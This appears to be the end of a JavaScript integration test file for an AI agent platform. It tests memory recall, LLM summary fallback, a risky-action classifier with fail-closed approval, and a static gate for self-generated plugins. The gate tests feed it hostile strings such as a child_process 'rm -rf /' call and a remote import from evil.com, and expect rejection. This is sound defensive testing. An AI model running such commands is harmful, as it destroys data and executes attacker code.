    const rec = mem.queryDumps('s-chunk')[0];
    assert(!!rec, '应能查到刚才的转储记录');
    assert(rec.summary === rec.chunks.join(' | '), 'summary 应为 chunks 拼接');
    assert(rec.memoryId === rec.memoryIds[0], 'memoryId 应指向首块');
  });

  await check('分块召回：问单个主题能命中对应块（不再是稀释后的大杂烩）', () => {
    const hits = mem.recall('主题3', { domain: 'project', k: 3 });
    assert(hits.length > 0, '应有召回结果');
    assert(/主题3/.test(String(hits[0].entry.text)),
      '首位应命中含「主题3」的块，实际 ' + JSON.stringify(hits.map((h) => String(h.entry.text).slice(0, 14))));
  });

  // ---------------- TF-IDF 未登录词（OOV）回归 ----------------
  // 这组锁的是「分块召回」用例暴露出来的真 bug：tfidf 对 IDF 表里没有的 token
  // 取 `(idf[k] ?? 0)` → 权重 0。最极端的后果是**第一条记忆**：写入时语料为空
  // → IDF 表为空 → 整条向量全零 → 余弦恒为 0 → 这条记忆永远召不回来（实测
  // 分块第一块的召回分就是 0.000000）。正确做法：OOV 恰恰最稀有、最有区分度，
  // 应拿最高 IDF（df=0 → log(1+n)+1），而不是 0。
  current = 'memory/IDF';
  console.log('== TF-IDF 未登录词（OOV 权重）==');

  const freshCtx = new Context();
  const freshMod = await import(pathToFileURL(require.resolve('../packages/plugin/memory/lib/index.js')).href);
  const freshPlugin = normalizeInject(freshMod);
  freshCtx.plugin(freshPlugin, typeof freshPlugin.Config === 'function' ? freshPlugin.Config({}) : undefined);
  await tick();
  const mem2 = freshCtx.memory ?? freshCtx.get('memory');

  await check('空语料下的第一条记忆可被召回（向量不再被空 IDF 表清零）', () => {
    mem2.record('project', '独角兽项目的数据库分片方案', { origin: 'test' });
    const hits = mem2.recall('独角兽', { domain: 'project', k: 3 });
    assert(hits.length > 0, '应有召回结果');
    assert(hits[0].score > 0, `第一条记忆的余弦必须 > 0（否则永远召回不到），实际 ${hits[0].score}`);
  });

  await check('新词（语料中零出现）拿到最高权重而非 0 —— OOV 最有区分度', () => {
    mem2.record('project', '常见的数据库索引优化', { origin: 'test' });
    mem2.record('project', '罕见的麒麟芯片烧录流程', { origin: 'test' });
    const hits = mem2.recall('麒麟芯片', { domain: 'project', k: 3 });
    assert(/麒麟/.test(String(hits[0].entry.text)), '首位应命中含「麒麟」的条目，实际 ' + String(hits[0].entry.text));
    assert(hits[0].score > hits[1].score, `OOV 词应显著领先，实际 ${hits[0].score} vs ${hits[1].score}`);
  });

  await check('常见词区分度低于罕见词（IDF 方向正确，未被拉平）', () => {
    const rare = mem2.recall('麒麟芯片', { domain: 'project', k: 3 });
    const common = mem2.recall('数据库', { domain: 'project', k: 3 });
    assert(rare[0].score > common[0].score,
      `罕见词命中分应高于常见词，实际 ${rare[0].score} vs ${common[0].score}`);
  });

  // ---------------- LLM 摘要 seam（FR-10 第一步）----------------
  // PRD 的转储链是「LLM 摘要 → 语义分块 → 向量编码 → 注入」。此前 setSummarize
  // 实现完整但**全项目零调用方**（第十五个死挂点），自动转储永远走抽取式兜底。
  // 这组锁的是 seam 的**契约**：注入即用、失败回落（摘要是增强不是必需，
  // 模型挂了绝不能让整批转储蒸发）、以及 mode 可观测。
  current = 'memory/摘要';
  console.log('== LLM 摘要 seam（FR-10）==');

  const seamMsgs = [];
  for (let i = 0; i < 12; i++) {
    // 每条 400+ 字符 → 预算 1200 下每块 2 条，共 3 块（mixed 用例需要 ≥2 块）。
    seamMsgs.push({ content: [{ type: 'text', text: `片段${i}：` + '正文'.repeat(200) }] });
  }

  await check('未注入 seam 时走抽取式兜底（mode=extractive）', async () => {
    const rec = await mem.dump('s-seam-0', seamMsgs, { domain: 'project' });
    assert(rec.mode === 'extractive', '实际 mode=' + rec.mode);
  });

  await check('注入 seam 后 dump 走模型摘要（mode=llm）', async () => {
    let calls = 0;
    mem2.setSummarize(async (msgs) => {
      calls++;
      return `模型摘要#${calls}（${msgs.length} 条）`;
    });
    const rec = await mem2.dump('s-seam-1', seamMsgs, { domain: 'project' });
    assert(rec.mode === 'llm', '实际 mode=' + rec.mode);
    assert(calls === rec.chunks.length, `每块应各调一次 seam，实际 ${calls} vs ${rec.chunks.length} 块`);
    assert(rec.chunks.every((c) => /^模型摘要#/.test(String(c))), '块内容应来自模型：' + JSON.stringify(rec.chunks));
  });

  await check('seam 抛错 → 整批回落抽取式，一块不丢（fail-open）', async () => {
    mem2.setSummarize(async () => { throw new Error('模型 429'); });
    const rec = await mem2.dump('s-seam-2', seamMsgs, { domain: 'project' });
    assert(rec.mode === 'extractive', '实际 mode=' + rec.mode);
    assert(rec.chunks.length >= 3, `块数不应因摘要失败而减少，实际 ${rec.chunks.length}`);
    assert(rec.chunks.every((c) => /^摘要（抽取式）/.test(String(c))), '应回落抽取式：' + JSON.stringify(rec.chunks.slice(0, 1)));
    assert(rec.memoryIds.length === rec.chunks.length, '每块仍应各产一条记忆');
  });

  await check('seam 返回空串 → 回落抽取式（空摘要不能当记忆存）', async () => {
    mem2.setSummarize(async () => '   ');
    const rec = await mem2.dump('s-seam-3', seamMsgs, { domain: 'project' });
    assert(rec.mode === 'extractive', '实际 mode=' + rec.mode);
    assert(rec.chunks.every((c) => /^摘要（抽取式）/.test(String(c))), '空白摘要应被丢弃并回落');
  });

  await check('部分块失败 → mode=mixed（可观测到「有的块没摘成」）', async () => {
    let n = 0;
    mem2.setSummarize(async () => {
      n++;
      if (n === 2) throw new Error('中途超时');
      return `模型摘要#${n}`;
    });
    const rec = await mem2.dump('s-seam-4', seamMsgs, { domain: 'project' });
    assert(rec.chunks.length >= 2, `需要至少 2 块才能构造 mixed，实际 ${rec.chunks.length}`);
    assert(rec.mode === 'mixed', '实际 mode=' + rec.mode);
  });

  // ---------------- prompt ----------------
  current = 'prompt';
  console.log('== prompt（提示词库）==');
  const pl = ctx.promptLib;
  await check('list 返回数组', () => {
    assert(Array.isArray(pl.list()), '应返回数组');
  });
  await check('create → get 往返', () => {
    const doc = pl.create({ title: '验证文档', body: '内容 {skill:test}', category: 'role' });
    const got = pl.get(doc.id || doc.docId || (doc.doc && doc.doc.id));
    assert(got, 'create 后应能 get 到');
  });
  await check('create 补全默认字段（缺 agents/priority 也不崩）', () => {
    const d = pl.create({ title: '缺字段文档', body: '内容', category: 'role' });
    assert(Array.isArray(d.agents), 'agents 应被补为数组');
    assert(typeof d.priority === 'number', 'priority 应被补为数字');
  });
  await check('含未解析 {skill:xxx} 的文档不导致 mergeForAgent 崩溃', () => {
    pl.create({ title: '含引用', body: '前缀 {skill:missing} 后缀', category: 'role' });
    const m = pl.mergeForAgent('orch');
    assert(m && Array.isArray(m.sections), '应含 sections');
    assert(Array.isArray(m.conflicts), '应含 conflicts');
  });
  await check('mergeForAgent 返回 sections + conflicts', () => {
    const m = pl.mergeForAgent('orch');
    assert(m && Array.isArray(m.sections), '应含 sections');
    assert(Array.isArray(m.conflicts), '应含 conflicts');
  });
  await check('resolveBody 在无 resolver 时原样保留引用标记', async () => {
    const body = await pl.resolveBody({ body: 'a {skill:x} b' });
    assert(typeof body === 'string' && body.includes('skill'), '应保留引用标记，实际 ' + body);
  });

  // ---------------- compensation ----------------
  current = 'compensation';
  console.log('== compensation（补偿层）==');
  const comp = ctx.compensation;
  await check('外发口语「发给客户」被识别为 external-message', () => {
    assert(comp.classify('把这封邮件发给客户').category === 'external-message',
      '实际 ' + comp.classify('把这封邮件发给客户').category);
  });
  await check('删除类被识别为 delete-file', () => {
    assert(comp.classify('删除所有日志文件').category === 'delete-file', '删除类分类错误');
  });
  await check('网络请求被识别为 network-egress', () => {
    assert(comp.classify('把结果 POST 到服务器').category === 'network-egress', '网络类分类错误');
  });
  await check('不可逆操作被识别为 irreversible', () => {
    assert(comp.classify('发布到生产环境').category === 'irreversible', '不可逆类分类错误');
  });
  await check('无害文本归为 other（不误报）', () => {
    assert(comp.classify('帮我总结一下这段话').category === 'other', '无害文本不应被误报');
  });
  await check('requiresWithhold 对全部高危类别返回 true', () => {
    for (const c of ['delete-file', 'external-message', 'network-egress', 'shared-file-write', 'irreversible']) {
      assert(comp.requiresWithhold(c) === true, `${c} 应需 withhold`);
    }
    assert(comp.requiresWithhold('other') === false, 'other 不应需 withhold');
  });
  // R3-16：原来这条用例调 comp.withhold({text, sessionId})——withhold 的签名是
  // (text: string) 且是**同步的 UI 预判器**（供设置页画「不可撤销」警示条），传对象会被
  // classifyOutbound 归为 other、needsConfirm=false；断言又读返回物上不存在的 proceed
  // 字段 → `undefined !== true` 恒真。这条 fail-closed 守护从来没真正跑过。
  // 现在拆成两条：withhold 自身按正确签名验；「审批被拒 → 拦截」走真正的
  // pre-step + approval seam 验。
  await check('withhold 按文本判需否二次确认（UI 预警条数据源）', () => {
    const yes = comp.withhold('把这封邮件发送给客户');
    assert(yes && yes.needsConfirm === true, '外发文本应需二次确认，实际 ' + JSON.stringify(yes));
    assert(typeof yes.warning === 'string' && yes.warning.length > 0, '需确认时应带警示文案');
    const no = comp.withhold('帮我总结一下这段话');
    assert(no && no.needsConfirm === false, '无害文本不应需确认，实际 ' + JSON.stringify(no));
  });
  await check('fail-closed：审批被拒时外发被拦截（reject）', async () => {
    try {
      setOutcome('rejected');
      const d = await firePreStep('把这封邮件发送给客户');
      assert(d && d.kind === 'reject', '审批被拒时应 reject，实际 ' + JSON.stringify(d));
    } finally {
      setOutcome('unavailable');
    }
  });
  await check('fail-closed：审批无人应答（unavailable）时外发被拦截', async () => {
    const d = await firePreStep('把这封邮件发送给客户');
    assert(d && d.kind === 'reject', '无应答方时应 reject，实际 ' + JSON.stringify(d));
  });
  await check('getAudit 返回数组', () => {
    assert(Array.isArray(comp.getAudit()), '审计应返回数组');
  });

  // ---------------- evolution ----------------
  current = 'evolution';
  console.log('== evolution（自进化）==');
  const evol = ctx.evolution;
  await check('静态门控拒绝危险代码（子进程执行）', () => {
    const r = evol.requireGate({ name: 'bad', code: "require('child_process').exec('rm -rf /')" });
    assert(r && r.allowed === false, '危险代码应被拒绝: ' + JSON.stringify(r));
    assert(String(r.reason || '').length > 0, '应给出拒绝原因');
  });
  await check('静态门控拒绝 eval / 远程 import / 进程自杀', () => {
    assert(evol.requireGate({ name: 'e', code: 'eval("x")' }).allowed === false, 'eval 应被拒绝');
    assert(evol.requireGate({ name: 'i', code: 'import("https://evil.com/a.js")' }).allowed === false, '远程 import 应被拒绝');
    assert(evol.requireGate({ name: 'k', code: 'process.exit(1)' }).allowed === false, 'process.exit 应被拒绝');
  });
  await check('安全代码通过门控且要求沙箱', () => {
    const r = evol.requireGate({ name: 'ok', code: 'export function run(t){ return t.toUpperCase(); }' });
    assert(r && r.allowed === true, '安全代码不应被拒绝: ' + JSON.stringify(r));
    assert(r.requiresSandbox === true, '应强制沙箱内运行');
  });
  await check('fail-closed：审批未通过时不加载临时插件', async () => {
    const r = await evol.createTempPlugin(
      { name: 'tmp1', code: 'export function run(t){ return t; }' },
      { sessionId: 's1' },
    );
    assert(r && r.ok === false, '未授权时不应加载：' + JSON.stringify(r));
  });
  await check('paranoid 铁律：自生成插件被拒且零审批请求（不问，直接拒）', async () => {
    // 与补偿层同源：主进程 approvalGate 在 paranoid 下直接拒不弹窗，evolution 此前
    // 无条件走 approval.request → 偏执模式下照样弹 GUI 确认框。固化：既要 ok=false，
    // 也一次都不发起审批请求。
    try {
      setAuthModeStore('paranoid');
      const before = approvalCalls.length;
      const r = await evol.createTempPlugin(
        { name: 'tmp-paranoid', code: 'export function run(t){ return t; }' },
        { sessionId: 's1', agent: { id: 'a1' } },
      );
      assert(r && r.ok === false, 'paranoid 档应拒绝自生成插件：' + JSON.stringify(r));
      assert(String(r.reason || '').includes('paranoid'),
        '拒绝原因应点明 paranoid（用户看得出是档位所致，不是门控故障）：' + String(r.reason));
      assert(approvalCalls.length === before,
        `paranoid 档不应发起审批请求（不弹窗），实际多发起 ${approvalCalls.length - before} 次`);
    } finally {
      setAuthModeStore('default');
    }
  });
  await check('list 与 getAudit 返回数组', () => {
    assert(Array.isArray(evol.list()), 'list 应返回数组');
    assert(Array.isArray(evol.getAudit()), 'getAudit 应返回数组');
  });

  // -------------------------------------------------------------------------
  console.log('\n' + log.join('\n'));
  console.log(`\n结果：通过 ${passed} / 失败 ${failed}\n`);
  // 收尾：先排空事件循环再销毁 Cordis context。直接 process.exit 会与插件悬挂
  // 句柄（fetch 等）在 Windows 上竞态炸 libuv 断言（UV_HANDLE_CLOSING），进程以
  // 0xC0000135 退出——断言全过但 verify 链误红（2026-09-23 实测）。
  try {
    await new Promise((r) => setTimeout(r, 200));
    await ctx.dispose();
    await new Promise((r) => setTimeout(r, 100));
  } catch { /* 销毁失败不掩盖测试结果 */ }
  process.exit(failed > 0 ? 1 : 0);
})().catch((e) => { console.error('异常:', e); process.exit(1); });
